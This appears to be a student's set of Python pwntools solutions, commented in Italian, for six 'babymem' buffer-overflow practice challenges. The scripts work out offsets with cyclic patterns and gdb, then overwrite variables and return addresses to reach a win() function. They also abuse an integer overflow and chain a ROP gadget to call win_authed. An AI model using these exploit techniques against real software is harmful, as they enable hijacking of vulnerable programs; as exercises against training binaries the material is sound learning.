#CHALLENGE1 - BUFFER OVERFLOW - overwrite VARIABILE calcolare offset 
#1. read(0,local58, local60) -> local58=&local48        buffer start: 0x48
#2. local18 !=0 ->                                      offset: 0x48-0x18   =0x30=48


from pwn import *

elf = ELF("/path-to-exe")	#ELF esegue un binario linux in py - in win c'è pe
p = elf.process()			#run 

p.sendline(b"5000")         #invio al binario 5000 - lunghezza default del buffer

print(p.clean())            #stampa tutto output del binario

payload = b"A"*48 + p64(1)         #riempio buffer di byte contenenti A; aggiungo 1 in byte(p64) così da sovvrascrivere local18

p.sendline(payload) #invio payload per attaccare e sostituire RETURN ADDRESS (DUMP STACK)

p.interactive() #stampa output

#CHALLENGE2 - BUFFER OVERFLOW
from pwn import *

elf = ELF("/challenge/babymem-level-2-1") 
p   = elf.process()

offset = 60             #(((-0x20)+4)-(-0x58))
magic  = 0x3b9cfe78

# 1) Payload size
p.recvuntil(b"Payload size: ")
size = offset + 4             # almeno fino all'int
p.sendline(str(size).encode())

# 2) Payload vero e proprio
payload  = b"A"*offset
payload += p32(magic)         # scrive 0x3b9cfe78 

p.send(payload)
p.interactive()


#CHALLENGE3 - BUFFER OVERFLOW - overwrite RETURN ADDRESS con la funzione win e calcolare offset 
#1. python3 -c 'from pwn import cyclic; print(cyclic(300).decode())' -> crea payload
#2. gdb run
#3. gdb i r rip -> se ciclico ok, altrimenti
#                   3.1 gdb i r rsp    
#                   3.2  x/40gx $rsp
#4. from pwn import cyclic_find; print(cyclic_find(0x6261616a)) -> output es. 152

from pwn import *

elf = ELF("/path-to-exe")	#ELF esegue un binario linux in py - in win c'è pe
p = elf.process()			#run 

p.sendline(b"5000")         #invio al binario 5000 - lunghezza default del buffer

print(p.clean())            #stampa tutto output del binario

print(hex(elf.symbols["win"]))   #symbols = attributo per ricavare indirizzo (per esadecimale aggiungere hex) della funzione "win"

#win va messo in RETURN ADDRESS
#1. capire lunghezza del buffer -> 152byte
#2. capire RETURN ADDRESS nello stack (quanti byte dopo buffer?) 

payload = b"A"*152 + p64(elf.symbols["win"])         #riempio buffer di byte contenenti A; aggiungo ADDRESS di win in byte(p64) così da sovvrascrivere RETURN ADDRESS con win

p.sendline(payload) #invio payload per attaccare e sostituire RETURN ADDRESS (DUMP STACK)

p.interactive() #stampa output


#from pwn import cyclic_find
#print(cyclic_find(0x62616177))   # tipico valore su 32 bit del pattern

#CHALLENGE4 - BUFFER OVERFLOW - overwrite 

from pwn import *

elf = ELF("/challenge/babymem-level-4-1")	#ELF esegue un binario linux in py - in win c'è pe
p = elf.process()			#run 

p.sendline(b"-1")         #invio al binario -1 - c'è controllo su size

print(p.clean())            #stampa tutto output del binario

print(hex(elf.symbols["win"]))   #symbols = attributo per ricavare indirizzo (per esadecimale aggiungere hex) della funzione "win"

#win va messo in RETURN ADDRESS
#1. capire lunghezza del buffer -> 152byte
#2. capire RETURN ADDRESS nello stack (quanti byte dopo buffer?) 

payload = b"A"*40 + p64(elf.symbols["win"])         #riempio buffer di byte contenenti A; aggiungo ADDRESS di win in byte(p64) così da sovvrascrivere RETURN ADDRESS con win

p.sendline(payload) #invio payload per attaccare e sostituire RETURN ADDRESS (DUMP STACK)

p.interactive() #stampa output

#CHALLENGE5
from pwn import *

elf = ELF("/challenge/babymem-level-5-1")
p   = elf.process()

offset = 72
win    = elf.symbols["win"]

# 1) Primo input: record_num
p.sendline(b"1073741824")      # negativo → sballa il prodotto

# 2) Secondo input: record_size
p.sendline(b"4")

# 3) Terzo input: payload overflow
payload  = b"A"*offset
payload += p64(win)    # sovrascrivi RIP con win()
p.sendline(payload)

p.interactive()

#CHALLENGE6
from pwn import *

elf = ELF("/challenge/babymem-level-6-1")
rop = ROP(elf)

p = elf.process()

# 1) Set size molto grande per triggerare overflow
p.recvuntil(b"Payload size:")
p.sendline(b"1000")  # qualunque numero alto

# 2) Costruisci payload
offset = 104  # esempio: 144
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
win_authed = elf.symbols["win_authed"]

payload  = b"A"*offset
payload += p64(pop_rdi)        # ROP gadget
payload += p64(0x1337)         # parametro per win_authed
payload += p64(win_authed)     # chiama win_authed(0x1337)

# 3) Manda il payload
p.recvuntil(b"Send your payload")
p.send(payload)

p.interactive()
